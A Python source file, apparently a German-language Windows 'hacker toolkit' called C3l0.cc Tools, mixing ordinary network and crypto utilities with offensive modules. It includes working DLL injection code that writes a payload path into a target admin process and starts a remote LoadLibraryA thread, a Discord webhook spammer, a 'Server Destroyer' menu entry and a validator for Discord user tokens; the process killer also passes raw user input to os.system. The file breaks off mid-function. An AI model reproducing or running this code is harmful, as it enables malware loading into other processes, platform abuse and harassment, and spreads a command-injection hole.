import os
import sys
import time
import math
import json
import socket
import platform
import hashlib
import secrets
import string
import msvcrt
import base64
import datetime
import asyncio
import subprocess
import ctypes
import urllib.request
import urllib.error
import pyfiglet
import discord
from rich.console import Console, Group
from rich.panel import Panel
from rich.prompt import Prompt
from rich.table import Table
from rich.align import Align
from rich.live import Live
from rich.text import Text

console = Console()

# Globale Theme-Konfiguration
current_theme = {
    "name": "Monochrome White",
    "primary": "bold white",
    "secondary": "dim white",
    "accent": "bold white"
}

def set_theme(theme_choice):
    global current_theme
    if theme_choice == "1":
        current_theme = {"name": "Monochrome White", "primary": "bold white", "secondary": "dim white", "accent": "bold white"}
    elif theme_choice == "2":
        current_theme = {"name": "Matrix Green", "primary": "bold green", "secondary": "green", "accent": "bold bright_green"}
    elif theme_choice == "3":
        current_theme = {"name": "Cyberpunk Red", "primary": "bold red", "secondary": "dark_red", "accent": "bold bright_red"}
    elif theme_choice == "4":
        current_theme = {"name": "Amber Gold", "primary": "bold yellow", "secondary": "yellow", "accent": "bold bright_yellow"}

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def hide_cursor():
    sys.stdout.write("\033[?25l")
    sys.stdout.flush()

def show_cursor():
    sys.stdout.write("\033[?25h")
    sys.stdout.flush()

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def print_banner():
    clear_screen()
    ascii_art = pyfiglet.figlet_format("C3l0.cc Tools", font="slant")
    console.print(Align.center(f"[{current_theme['primary']}]{ascii_art}[/{current_theme['primary']}]"))
    console.print(Align.center(f"[{current_theme['secondary']}]v1.9.0 | Theme: {current_theme['name']}[/{current_theme['secondary']}]\n"))

def get_wave_char(x, y, tick):
    t = tick * 0.04
    w1 = math.sin(x * 0.08 + t) * 3.0 + math.cos(y * 0.15 - t * 0.7) * 2.0
    w2 = math.sin((x - y) * 0.06 - t * 1.2) * 2.5
    
    val = (w1 + w2) % 6.0
    
    if val < 0.35:
        slope = math.cos(x * 0.08 + t)
        if slope > 0.35:
            return "/"
        elif slope < -0.35:
            return "\\"
        return "-"
    elif 2.8 < val < 3.1:
        return "~"
    return " "

def build_bg_segment(start_x, length, y, tick):
    return "".join(get_wave_char(start_x + i, y, tick) for i in range(length))

def render_loading_frame(progress_pct, tick):
    width = console.size.width
    height = console.size.height - 1

    ascii_banner = pyfiglet.figlet_format("C3l0.cc Tools", font="slant").splitlines()
    banner_height = len(ascii_banner)
    banner_width = max(len(line) for line in ascii_banner)

    bar_width = 44
    filled = int((progress_pct / 100) * bar_width)
    bar_str = f"[{'█' * filled}{'░' * (bar_width - filled)}] {progress_pct:3.0f}%"
    status_str = "INITIALISIERE C3L0.CC ENVIRONMENT..."

    box_height = banner_height + 4
    start_y = max(0, (height - box_height) // 2)
    banner_start_x = max(0, (width - banner_width) // 2)
    bar_start_x = max(0, (width - len(bar_str)) // 2)
    status_start_x = max(0, (width - len(status_str)) // 2)

    frame = Text()

    for y in range(height):
        line = Text()
        if start_y <= y < start_y + banner_height:
            b_line = ascii_banner[y - start_y].ljust(banner_width)
            left_bg = build_bg_segment(0, banner_start_x, y, tick)
            right_start = banner_start_x + banner_width
            right_len = max(0, width - right_start)
            right_bg = build_bg_segment(right_start, right_len, y, tick)
            
            line.append(left_bg, style="grey27")
            line.append(b_line, style="bold white")
            line.append(right_bg, style="grey27")

        elif y == start_y + banner_height + 1:
            left_bg = build_bg_segment(0, status_start_x, y, tick)
            right_start = status_start_x + len(status_str)
            right_len = max(0, width - right_start)
            right_bg = build_bg_segment(right_start, right_len, y, tick)
            
            line.append(left_bg, style="grey27")
            line.append(status_str, style="dim white")
            line.append(right_bg, style="grey27")

        elif y == start_y + banner_height + 2:
            left_bg = build_bg_segment(0, bar_start_x, y, tick)
            right_start = bar_start_x + len(bar_str)
            right_len = max(0, width - right_start)
            right_bg = build_bg_segment(right_start, right_len, y, tick)
            
            line.append(left_bg, style="grey27")
            line.append(bar_str, style="bold white")
            line.append(right_bg, style="grey27")

        else:
            bg_line = build_bg_segment(0, width, y, tick)
            line.append(bg_line, style="grey27")

        frame.append(line)
        if y < height - 1:
            frame.append("\n")

    return frame

def boot_sequence():
    clear_screen()
    with Live(render_loading_frame(0, 0), console=console, refresh_per_second=20, screen=True) as live:
        for step in range(101):
            live.update(render_loading_frame(step, step))
            time.sleep(0.03)

def build_menu_renderable(selected, options, subtitle=None):
    if subtitle is None:
        subtitle = f"v1.9.0 | Active Theme: {current_theme['name']}"
        
    ascii_art = pyfiglet.figlet_format("C3l0.cc Tools", font="slant")
    
    table = Table(show_header=True, header_style=current_theme['primary'], border_style="dim white", width=65)
    table.add_column("ID", style=current_theme['primary'], justify="center", width=6)
    table.add_column("Modul", style="white")
    table.add_column("Beschreibung", style="dim white")

    for idx, (m_id, m_name, m_desc) in enumerate(options):
        if idx == selected:
            table.add_row(
                f"[reverse {current_theme['primary']}] {m_id} [/reverse {current_theme['primary']}]",
                f"[reverse {current_theme['primary']}] {m_name} [/reverse {current_theme['primary']}]",
                f"[reverse {current_theme['primary']}] {m_desc} [/reverse {current_theme['primary']}]"
            )
        else:
            table.add_row(m_id, m_name, m_desc)

    admin_status = "[bold green]ADMIN[/bold green]" if is_admin() else "[yellow]USER[/yellow]"
    content = Group(
        Align.center(f"[{current_theme['primary']}]{ascii_art}[/{current_theme['primary']}]"),
        Align.center(f"[{current_theme['secondary']}]{subtitle} | Status: {admin_status}[/{current_theme['secondary']}]\n"),
        Align.center(table),
        Align.center(f"\n[{current_theme['secondary']}][↑/↓] Navigieren  |  [Enter] Auswählen  |  [Ziffer] Direktwahl[/{current_theme['secondary']}]")
    )
    return content

def interactive_menu():
    options = [
        ("01", "Netzwerk & Web Utility", "IP, Port, DNS, HTTP Builder & TCP Listener"),
        ("02", "System & Prozesse", "System Info, File Integrity, Process Manager & Injection"),
        ("03", "Discord & OSINT Tools", "Webhook, Destroyer, Token, Dumper & ID Inspector"),
        ("04", "Crypto & Codec", "Hashes, Passwörter, Base64 & Hex Codec"),
        ("05", "Code & Utilities", "Quick Snippet / Payload Manager"),
        ("06", "Bildschirmschoner", "Live ASCII-Wellen Animation starten"),
        ("07", "Settings", "Design, Farben & UI-Themes anpassen"),
        ("00", "Beenden", "Tool schließen")
    ]
    selected = 0

    with Live(build_menu_renderable(selected, options), console=console, refresh_per_second=30, screen=True) as live:
        while True:
            if msvcrt.kbhit():
                key = msvcrt.getch()
                if key == b'\xe0':
                    arrow = msvcrt.getch()
                    if arrow == b'H':
                        selected = (selected - 1) % len(options)
                    elif arrow == b'P':
                        selected = (selected + 1) % len(options)
                elif key == b'\r':
                    return options[selected][0]
                elif key in b'12345670':
                    char = key.decode()
                    if char == '0':
                        return "00"
                    for idx, opt in enumerate(options):
                        if opt[0].endswith(char):
                            return opt[0]
                
                live.update(build_menu_renderable(selected, options))
            time.sleep(0.01)

def interactive_network_menu():
    options = [
        ("01", "IP Lookup", "Öffentliche IP- & Geo-Informationen abrufen"),
        ("02", "Port Scanner", "Zielhost auf Standard-Ports prüfen"),
        ("03", "DNS Lookup", "A-Records & DNS-Informationen abfragen"),
        ("04", "HTTP Request Builder", "GET- & POST-Anfragen an APIs senden"),
        ("05", "Local TCP Listener", "Eingehende TCP-Verbindungen abfangen"),
        ("00", "Zurück", "Zum Hauptmenü zurückkehren")
    ]
    selected = 0

    with Live(build_menu_renderable(selected, options, subtitle=f"Network & Web Utility | Theme: {current_theme['name']}"), console=console, refresh_per_second=30, screen=True) as live:
        while True:
            if msvcrt.kbhit():
                key = msvcrt.getch()
                if key == b'\xe0':
                    arrow = msvcrt.getch()
                    if arrow == b'H':
                        selected = (selected - 1) % len(options)
                    elif arrow == b'P':
                        selected = (selected + 1) % len(options)
                elif key == b'\r':
                    return options[selected][0]
                elif key in b'123450':
                    char = key.decode()
                    if char == '0':
                        return "00"
                    for idx, opt in enumerate(options):
                        if opt[0].endswith(char):
                            return opt[0]
                
                live.update(build_menu_renderable(selected, options, subtitle=f"Network & Web Utility | Theme: {current_theme['name']}"))
            time.sleep(0.01)

def interactive_system_menu():
    options = [
        ("01", "System Info", "Lokale Hardware- & OS-Daten anzeigen"),
        ("02", "File Integrity", "SHA-256 Prüfsumme für Dateien ermitteln"),
        ("03", "Process Manager", "Laufende Prozesse anzeigen & beenden"),
        ("04", "Process Injection", "Payload in Admin-Prozess injizieren"),
        ("00", "Zurück", "Zum Hauptmenü zurückkehren")
    ]
    selected = 0

    with Live(build_menu_renderable(selected, options, subtitle=f"System & Process | Theme: {current_theme['name']}"), console=console, refresh_per_second=30, screen=True) as live:
        while True:
            if msvcrt.kbhit():
                key = msvcrt.getch()
                if key == b'\xe0':
                    arrow = msvcrt.getch()
                    if arrow == b'H':
                        selected = (selected - 1) % len(options)
                    elif arrow == b'P':
                        selected = (selected + 1) % len(options)
                elif key == b'\r':
                    return options[selected][0]
                elif key in b'12340':
                    char = key.decode()
                    if char == '0':
                        return "00"
                    for idx, opt in enumerate(options):
                        if opt[0].endswith(char):
                            return opt[0]
                
                live.update(build_menu_renderable(selected, options, subtitle=f"System & Process | Theme: {current_theme['name']}"))
            time.sleep(0.01)

def interactive_discord_menu():
    options = [
        ("01", "Webhook Sender", "Nachrichten an Discord-Webhooks senden"),
        ("02", "Standalone Spammer", "Webhooks ohne Bot-Token fluten"),
        ("03", "Server Destroyer", "Bot online & Multi-Webhook Flood starten"),
        ("04", "Token Validator", "Bot- oder User-Token auf Gültigkeit prüfen"),
        ("05", "Server Dumper", "Server-Metadaten in JSON-Datei exportieren"),
        ("06", "User ID Inspector", "Snowflake-Analyse, Username & Links Finder"),
        ("00", "Zurück", "Zum Hauptmenü zurückkehren")
    ]
    selected = 0

    with Live(build_menu_renderable(selected, options, subtitle=f"Discord & OSINT | Theme: {current_theme['name']}"), console=console, refresh_per_second=30, screen=True) as live:
        while True:
            if msvcrt.kbhit():
                key = msvcrt.getch()
                if key == b'\xe0':
                    arrow = msvcrt.getch()
                    if arrow == b'H':
                        selected = (selected - 1) % len(options)
                    elif arrow == b'P':
                        selected = (selected + 1) % len(options)
                elif key == b'\r':
                    return options[selected][0]
                elif key in b'1234560':
                    char = key.decode()
                    if char == '0':
                        return "00"
                    for idx, opt in enumerate(options):
                        if opt[0].endswith(char):
                            return opt[0]
                
                live.update(build_menu_renderable(selected, options, subtitle=f"Discord & OSINT | Theme: {current_theme['name']}"))
            time.sleep(0.01)

def interactive_crypto_menu():
    options = [
        ("01", "Hash Generator", "MD5, SHA-256 & SHA-512 erstellen"),
        ("02", "Passwort Generator", "Sichere Zufallsschlüssel generieren"),
        ("03", "Base64 & Hex Codec", "Strings kodieren und dekodieren"),
        ("00", "Zurück", "Zum Hauptmenü zurückkehren")
    ]
    selected = 0

    with Live(build_menu_renderable(selected, options, subtitle=f"Codec & Crypto | Theme: {current_theme['name']}"), console=console, refresh_per_second=30, screen=True) as live:
        while True:
            if msvcrt.kbhit():
                key = msvcrt.getch()
                if key == b'\xe0':
                    arrow = msvcrt.getch()
                    if arrow == b'H':
                        selected = (selected - 1) % len(options)
                    elif arrow == b'P':
                        selected = (selected + 1) % len(options)
                elif key == b'\r':
                    return options[selected][0]
                elif key in b'1230':
                    char = key.decode()
                    if char == '0':
                        return "00"
                    for idx, opt in enumerate(options):
                        if opt[0].endswith(char):
                            return opt[0]
                
                live.update(build_menu_renderable(selected, options, subtitle=f"Codec & Crypto | Theme: {current_theme['name']}"))
            time.sleep(0.01)

def module_settings():
    clear_screen()
    console.print(Align.center(Panel(f"[{current_theme['primary']}]Settings & Theme Manager[/{current_theme['primary']}]", border_style="dim white", width=65)))
    
    table = Table(show_header=True, header_style=current_theme['primary'], border_style="dim white", width=65)
    table.add_column("ID", style=current_theme['primary'], justify="center", width=6)
    table.add_column("Theme Name", style="white")
    table.add_column("Beschreibung", style="dim white")

    table.add_row("1", "Monochrome White", "Klassischer Weiß / Grau Look")
    table.add_row("2", "Matrix Green", "Terminal Grün Look")
    table.add_row("3", "Cyberpunk Red", "Aggressiver Rot Look")
    table.add_row("4", "Amber Gold", "Retro Bernstein / Gelb Look")
    table.add_row("0", "Zurück", "Zum Hauptmenü")

    console.print(Align.center(table))
    choice = Prompt.ask(f"\n[{current_theme['primary']}]Wähle ein Theme aus (1-4)[/{current_theme['primary']}]", choices=["1", "2", "3", "4", "0"], default="0")
    
    if choice in ["1", "2", "3", "4"]:
        set_theme(choice)
        console.print(Align.center(f"\n[bold green]Theme erfolgreich zu '{current_theme['name']}' gewechselt![/bold green]"))
        time.sleep(1)

def module_ip_lookup():
    clear_screen()
    console.print(Align.center(Panel(f"[{current_theme['primary']}]IP Lookup & Geo Intelligence[/{current_theme['primary']}]", border_style="dim white", width=65)))
    try:
        with console.status(f"[{current_theme['secondary']}]Frage IP-Registry ab...[/{current_theme['secondary']}]", spinner="dots"):
            data = None
            try:
                req = urllib.request.Request("https://ipapi.co/json/", headers={"User-Agent": "Mozilla/5.0"})
                with urllib.request.urlopen(req, timeout=5) as resp:
                    data = json.loads(resp.read().decode())
            except Exception:
                pass
            
            if not data or "ip" not in data:
                req = urllib.request.Request("http://ip-api.com/json/", headers={"User-Agent": "Mozilla/5.0"})
                with urllib.request.urlopen(req, timeout=5) as resp:
                    raw = json.loads(resp.read().decode())
                    data = {
                        "ip": raw.get("query", "N/A"),
                        "city": raw.get("city", "N/A"),
                        "region": raw.get("regionName", "N/A"),
                        "country_name": raw.get("country", "N/A"),
                        "postal": raw.get("zip", "N/A"),
                        "org": raw.get("isp", "N/A"),
                        "asn": raw.get("as", "N/A"),
                        "timezone": raw.get("timezone", "N/A")
                    }
        
        table = Table(show_header=False, border_style="dim white", width=65)
        table.add_column("Key", style=current_theme['primary'])
        table.add_column("Value", style="white")
        
        table.add_row("IP-Adresse", data.get("ip", "N/A"))
        table.add_row("Stadt", data.get("city", "N/A"))
        table.add_row("Region", data.get("region", "N/A"))
        table.add_row("Land", data.get("country_name", "N/A"))
        table.add_row("Postleitzahl", data.get("postal", "N/A"))
        table.add_row("Netzwerk / ISP", data.get("org", "N/A"))
        table.add_row("ASN", data.get("asn", "N/A"))
        table.add_row("Zeitzone", data.get("timezone", "N/A"))
        
        console.print(Align.center(table))
    except Exception as e:
        console.print(Align.center(f"[red]Fehler beim Abrufen der IP-Daten: {e}[/red]"))
    
    Prompt.ask(f"\n[{current_theme['secondary']}]Drücke Enter um zum Hauptmenü zurückzukehren[/{current_theme['secondary']}]")

def module_port_scanner():
    clear_screen()
    console.print(Align.center(Panel(f"[{current_theme['primary']}]TCP Port Scanner[/{current_theme['primary']}]", border_style="dim white", width=65)))
    target = Prompt.ask(f"[{current_theme['primary']}]Ziel-IP oder Hostname eingeben[/{current_theme['primary']}]")
    ports = [21, 22, 23, 25, 53, 80, 110, 135, 443, 445, 3306, 3389, 8080, 25565]
    
    table = Table(show_header=True, header_style=current_theme['primary'], border_style="dim white", width=65)
    table.add_column("Port", style=current_theme['primary'], justify="center")
    table.add_column("Dienst", style="white")
    table.add_column("Status", style=current_theme['primary'], justify="center")
    
    with console.status(f"[{current_theme['secondary']}]Scanne {target}...[/{current_theme['secondary']}]", spinner="dots"):
        results = []
        for p in ports:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.5)
                res = s.connect_ex((target, p))
                s.close()
                status = "OFFEN" if res == 0 else "GESCHLOSSEN"
                results.append((p, status))
            except:
                results.append((p, "FEHLER"))
    
    services = {
        21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS", 
        80: "HTTP", 110: "POP3", 135: "RPC", 443: "HTTPS", 445: "SMB", 
        3306: "MySQL", 3389: "RDP", 8080: "HTTP-Proxy", 25565: "Minecraft"
    }
    for p, status in results:
        style = current_theme['primary'] if status == "OFFEN" else current_theme['secondary']
        table.add_row(str(p), services.get(p, "Unbekannt"), f"[{style}]{status}[/{style}]")
    
    console.print(Align.center(table))
    Prompt.ask(f"\n[{current_theme['secondary']}]Drücke Enter um zum Hauptmenü zurückzukehren[/{current_theme['secondary']}]")

def module_dns_lookup():
    clear_screen()
    console.print(Align.center(Panel(f"[{current_theme['primary']}]DNS Lookup & Recon[/{current_theme['primary']}]", border_style="dim white", width=65)))
    domain = Prompt.ask(f"[{current_theme['primary']}]Ziel-Domain eingeben (z.B. google.com)[/]")
    
    table = Table(show_header=True, header_style=current_theme['primary'], border_style="dim white", width=65)
    table.add_column("Record", style=current_theme['primary'], justify="center")
    table.add_column("Wert / IP", style="white")
    
    with console.status(f"[{current_theme['secondary']}]Frage DNS-Records für {domain} ab...[/{current_theme['secondary']}]", spinner="dots"):
        try:
            ip = socket.gethostbyname(domain)
            table.add_row("A (IPv4)", ip)
        except Exception as e:
            table.add_row("A (IPv4)", f"[red]Fehler: {e}[/red]")
        
        try:
            url = f"https://cloudflare-dns.com/dns-query?name={domain}&type=TXT"
            req = urllib.request.Request(url, headers={"Accept": "application/dns-json", "User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=5) as resp:
                data = json.loads(resp.read().decode())
                answers = data.get("Answer", [])
                txt_found = False
                for ans in answers:
                    if ans.get("type") == 16:
                        table.add_row("TXT", ans.get("data", ""))
                        txt_found = True
                if not txt_found:
                    table.add_row("TXT", "Keine Einträge gefunden")
        except Exception:
            table.add_row("TXT", "Abfrage fehlgeschlagen")

    console.print(Align.center(table))
    Prompt.ask(f"\n[{current_theme['secondary']}]Drücke Enter um zum Hauptmenü zurückzukehren[/{current_theme['secondary']}]")

def module_http_builder():
    clear_screen()
    console.print(Align.center(Panel(f"[{current_theme['primary']}]HTTP Request Builder (API Tester)[/{current_theme['primary']}]", border_style="dim white", width=65)))
    url = Prompt.ask(f"[{current_theme['primary']}]URL eingeben[/{current_theme['primary']}]")
    method = Prompt.ask(f"[{current_theme['primary']}]Methode[/{current_theme['primary']}]", choices=["GET", "POST"], default="GET")
    body = ""
    if method == "POST":
        body = Prompt.ask(f"[{current_theme['primary']}]JSON Payload (optional)[/]", default="")
    
    table = Table(show_header=False, border_style="dim white", width=65)
    table.add_column("Property", style=current_theme['primary'])
    table.add_column("Response", style="white")

    with console.status(f"[{current_theme['secondary']}]Sende HTTP Request...[/{current_theme['secondary']}]", spinner="dots"):
        try:
            data = body.encode("utf-8") if body else None
            req = urllib.request.Request(
                url, 
                data=data, 
                headers={"Content-Type": "application/json", "User-Agent": "C3l0-Tools"}
            )
            method_override = method
            req.get_method = lambda: method_override
            
            with urllib.request.urlopen(req, timeout=5) as resp:
                status = resp.status
                content = resp.read().decode("utf-8", errors="ignore")
                try:
                    parsed = json.dumps(json.loads(content), indent=2)
                except:
                    parsed = content[:1000]
                
                table.add_row("Status Code", str(status))
                table.add_row("Antwort", parsed)
        except urllib.error.HTTPError as e:
            table.add_row("HTTP Fehler", f"[red]{e.code} - {e.reason}[/red]")
        except Exception as e:
            table.add_row("Fehler", f"[red]{e}[/red]")

    console.print(Align.center(table))
    Prompt.ask(f"\n[{current_theme['secondary']}]Drücke Enter um zum Hauptmenü zurückzukehren[/{current_theme['secondary']}]")

def module_tcp_listener():
    clear_screen()
    console.print(Align.center(Panel(f"[{current_theme['primary']}]Local TCP Listener (Netcat Clone)[/{current_theme['primary']}]", border_style="dim white", width=65)))
    try:
        port = int(Prompt.ask(f"[{current_theme['primary']}]Port zum Lauschen eingeben[/{current_theme['primary']}]", default="8080"))
    except:
        port = 8080

    console.print(Align.center(f"[{current_theme['secondary']}]Lausche auf Port {port}... Drücke Strg+C zum Abbrechen[/{current_theme['secondary']}]"))
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(("0.0.0.0", port))
        s.listen(1)
        s.settimeout(15.0)
        
        conn, addr = s.accept()
        with conn:
            console.print(f"[bold green]Verbindung von {addr} empfangen![/bold green]")
            data = conn.recv(4096)
            console.print(Panel(data.decode("utf-8", errors="ignore"), title="Empfangene Daten", border_style="dim white"))
            conn.sendall(b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nOK")
        s.close()
    except socket.timeout:
        console.print("[yellow]Timeout: Keine Verbindung empfangen.[/yellow]")
    except Exception as e:
        console.print(f"[red]Fehler: {e}[/red]")

    Prompt.ask(f"\n[{current_theme['secondary']}]Drücke Enter um zum Hauptmenü zurückzukehren[/{current_theme['secondary']}]")

def module_system_info():
    clear_screen()
    console.print(Align.center(Panel(f"[{current_theme['primary']}]Local System Diagnostics[/{current_theme['primary']}]", border_style="dim white", width=65)))
    
    table = Table(show_header=False, border_style="dim white", width=65)
    table.add_column("Property", style=current_theme['primary'])
    table.add_column("Value", style="white")
    
    try:
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
    except:
        hostname = "Unbekannt"
        local_ip = "Unbekannt"

    table.add_row("Betriebssystem", f"{platform.system()} {platform.release()}")
    table.add_row("Build / Version", platform.version())
    table.add_row("Architektur", platform.architecture()[0])
    table.add_row("Prozessor", platform.processor() or "Unbekannt")
    table.add_row("Hostname", hostname)
    table.add_row("Lokale IP", local_ip)
    table.add_row("Python Version", platform.python_version())
    table.add_row("Admin Privilegien", "Ja (Aktiv)" if is_admin() else "Nein (Eingeschränkt)")
    
    console.print(Align.center(table))
    Prompt.ask(f"\n[{current_theme['secondary']}]Drücke Enter um zum Hauptmenü zurückzukehren[/{current_theme['secondary']}]")

def module_file_integrity():
    clear_screen()
    console.print(Align.center(Panel(f"[{current_theme['primary']}]File Integrity Checker (SHA-256)[/{current_theme['primary']}]", border_style="dim white", width=65)))
    filepath = Prompt.ask(f"[{current_theme['primary']}]Pfad zur Datei eingeben[/{current_theme['primary']}]").strip('"')
    
    table = Table(show_header=False, border_style="dim white", width=65)
    table.add_column("Eigenschaft", style=current_theme['primary'])
    table.add_column("Wert", style="white")

    if os.path.isfile(filepath):
        with console.status(f"[{current_theme['secondary']}]Berechne SHA-256 Prüfsumme...[/{current_theme['secondary']}]", spinner="dots"):
            sha256_hash = hashlib.sha256()
            try:
                with open(filepath, "rb") as f:
                    for byte_block in iter(lambda: f.read(4096), b""):
                        sha256_hash.update(byte_block)
                file_hash = sha256_hash.hexdigest()
                file_size = os.path.getsize(filepath)
                table.add_row("Dateiname", os.path.basename(filepath))
                table.add_row("Größe", f"{file_size} Bytes")
                table.add_row("SHA-256", file_hash)
            except Exception as e:
                table.add_row("Fehler", f"[red]{e}[/red]")
    else:
        table.add_row("Status", "[bold red]Datei nicht gefunden![/bold red]")

    console.print(Align.center(table))
    Prompt.ask(f"\n[{current_theme['secondary']}]Drücke Enter um zum Menü zurückzukehren[/{current_theme['secondary']}]")

def module_process_manager():
    clear_screen()
    console.print(Align.center(Panel(f"[{current_theme['primary']}]Process Manager & Killer[/{current_theme['primary']}]", border_style="dim white", width=65)))
    
    table = Table(show_header=True, header_style=current_theme['primary'], border_style="dim white", width=65)
    table.add_column("PID", style=current_theme['primary'], justify="center", width=10)
    table.add_column("Prozess", style="white")

    processes = []
    try:
        if os.name == 'nt':
            output = os.popen('tasklist /fo csv /nh').read().splitlines()
            for line in output[:15]:
                parts = line.replace('"', '').split(',')
                if len(parts) >= 2:
                    processes.append((parts[1], parts[0]))
        else:
            output = os.popen('ps -e -o pid,comm --no-headers').read().splitlines()
            for line in output[:15]:
                parts = line.strip().split(None, 1)
                if len(parts) >= 2:
                    processes.append((parts[0], parts[1]))
    except:
        pass

    for pid, name in processes:
        table.add_row(pid, name)

    console.print(Align.center(table))
    action = Prompt.ask(f"\n[{current_theme['primary']}]Möchtest du einen Prozess per PID beenden? (j/n)[/{current_theme['primary']}]", default="n")
    if action.lower() == "j":
        target_pid = Prompt.ask(f"[{current_theme['primary']}]PID eingeben[/{current_theme['primary']}]")
        try:
            if os.name == 'nt':
                os.system(f"taskkill /f /pid {target_pid} >nul 2>&1")
            else:
                os.system(f"kill -9 {target_pid}")
            console.print("[bold green]Prozess beendet.[/bold green]")
        except Exception as e:
            console.print(f"[red]Fehler: {e}[/red]")
        Prompt.ask(f"\n[{current_theme['secondary']}]Drücke Enter um fortzufahren[/{current_theme['secondary']}]")

def module_process_injection():
    clear_screen()
    console.print(Align.center(Panel(f"[{current_theme['primary']}]Process Injection (Admin Context)[/{current_theme['primary']}]", border_style="dim white", width=65)))
    
    if not is_admin():
        console.print(Align.center("[bold red]Warnung: Tool läuft nicht als Administrator![/bold red]"))
        console.print(Align.center(f"[{current_theme['secondary']}]Das Öffnen von Admin-Prozessen schlägt ohne Admin fehl.[/{current_theme['secondary']}]\n"))
    
    target_pid_str = Prompt.ask(f"[{current_theme['primary']}]Ziel-PID (Process ID) eingeben[/{current_theme['primary']}]")
    dll_path = Prompt.ask(f"[{current_theme['primary']}]Pfad zur DLL / Payload eingeben[/{current_theme['primary']}]").strip('"')
    
    table = Table(show_header=False, border_style="dim white", width=65)
    table.add_column("Status", style=current_theme['primary'])
    table.add_column("Details", style="white")

    if not os.path.exists(dll_path):
        table.add_row("Fehler", "[red]DLL-Datei nicht gefunden![/red]")
        console.print(Align.center(table))
        Prompt.ask(f"\n[{current_theme['secondary']}]Drücke Enter um fortzufahren[/{current_theme['secondary']}]")
        return

    try:
        pid = int(target_pid_str)
        if os.name == 'nt':
            PROCESS_ALL_ACCESS = (0x000F0000 | 0x00100000 | 0xFFF)
            
            with console.status(f"[{current_theme['secondary']}]Öffne Handle zum Zielprozess...[/{current_theme['secondary']}]", spinner="dots"):
                h_process = ctypes.windll.kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
                if not h_process:
                    raise ctypes.WinError()

                dll_bytes = (dll_path + '\0').encode('utf-8')
                dll_len = len(dll_bytes)

                MEM_COMMIT = 0x1000
                MEM_RESERVE = 0x2000
                PAGE_EXECUTE_READWRITE = 0x40

                arg_address = ctypes.windll.kernel32.VirtualAllocEx(
                    h_process, 0, dll_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
                )
                if not arg_address:
                    raise ctypes.WinError()

                written = ctypes.c_size_t(0)
                res_write = ctypes.windll.kernel32.WriteProcessMemory(
                    h_process, arg_address, dll_bytes, dll_len, ctypes.byref(written)
                )
                if not res_write:
                    raise ctypes.WinError()

                h_kernel32 = ctypes.windll.kernel32.GetModuleHandleW("kernel32.dll")
                h_loadlib = ctypes.windll.kernel32.GetProcAddress(h_kernel32, b"LoadLibraryA")

                h_thread = ctypes.windll.kernel32.CreateRemoteThread(
                    h_process, None, 0, h_loadlib, arg_address, 0, None
                )
                if not h_thread:
                    raise ctypes.WinError()

                table.add_row("Status", "[bold green]ERFOLGREICH INiziert[/bold green]")
                table.add_row("Ziel PID", str(pid))
                table.add_row("Remote Thread", str(h_thread))
                ctypes.windll.kernel32.CloseHandle(h_process)
        else:
            table.add_row("Status", "[red]Process Injection unter Linux nicht implementiert.[/red]")
    except Exception as e:
        table.add_row("Status", f"[bold red]Injektion fehlgeschlagen: {e}[/bold red]")

    console.print(Align.center(table))
    Prompt.ask(f"\n[{current_theme['secondary']}]Drücke Enter um zum Menü zurückzukehren[/{current_theme['secondary']}]")

def module_webhook_sender():
    clear_screen()
    console.print(Align.center(Panel(f"[{current_theme['primary']}]Discord Webhook Dispatcher[/{current_theme['primary']}]", border_style="dim white", width=65)))
    url = Prompt.ask(f"[{current_theme['primary']}]Webhook URL[/{current_theme['primary']}]")
    message = Prompt.ask(f"[{current_theme['primary']}]Nachricht[/{current_theme['primary']}]")
    
    try:
        payload = json.dumps({"content": message}).encode("utf-8")
        req = urllib.request.Request(url, data=payload, headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req) as response:
            if response.status in [200, 204]:
                console.print(Align.center(f"\n[{current_theme['primary']}]Nachricht erfolgreich versendet.[/{current_theme['primary']}]"))
            else:
                console.print(Align.center(f"\n[yellow]Server antwortete mit Status Code: {response.status}[/yellow]"))
    except Exception as e:
        console.print(Align.center(f"\n[red]Fehler beim Senden: {e}[/red]"))
    
    Prompt.ask(f"\n[{current_theme['secondary']}]Drücke Enter um zum Menü zurückzukehren[/{current_theme['secondary']}]")

def module_standalone_spammer():
    clear_screen()
    console.print(Align.center(Panel(f"[{current_theme['primary']}]Standalone Webhook Spammer[/{current_theme['primary']}]", border_style="dim white", width=65)))
    url = Prompt.ask(f"[{current_theme['primary']}]Webhook URL[/{current_theme['primary']}]")
    message = Prompt.ask(f"[{current_theme['primary']}]Nachricht[/{current_theme['primary']}]")
    try:
        count = int(Prompt.ask(f"[{current_theme['primary']}]Anzahl Nachrichten[/{current_theme['primary']}]", default="50"))
    except:
        count = 50

    sent = 0
    with console.status(f"[{current_theme['secondary']}]Flute Webhook...[/{current_theme['secondary']}]", spinner="dots"):
        for _ in range(count):
            try:
                payload = json.dumps({"content": message}).encode("utf-8")
                req = urllib.request.Request(url, data=payload, headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"})
                with urllib.request.urlopen(req, timeout=3):
                    sent += 1
            except:
                pass
            time.sleep(0.05)

    console.print(Align.center(f"\n[bold green]{sent}/{count} Nachrichten erfolgreich gesendet.[/bold green]"))
    Prompt.ask(f"\n[{current_theme['secondary']}]Drücke Enter um zum Menü zurückzukehren[/{current_theme['secondary']}]")

def module_token_validator():
    clear_screen()
    console.print(Align.center(Panel(f"[{current_theme['primary']}]Discord Token Validator[/{current_theme['primary']}]", border_style="dim white", width=65)))
    token = Prompt.ask(f"[{current_theme['primary']}]Token eingeben (Bot oder User)[/]")
    
    headers = {
        "Authorization": f"Bot {token.strip()}" if not token.startswith("M") else token.strip(),
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0"
    }
    
    table = Table(show_header=False, border_style="dim white", width=65)
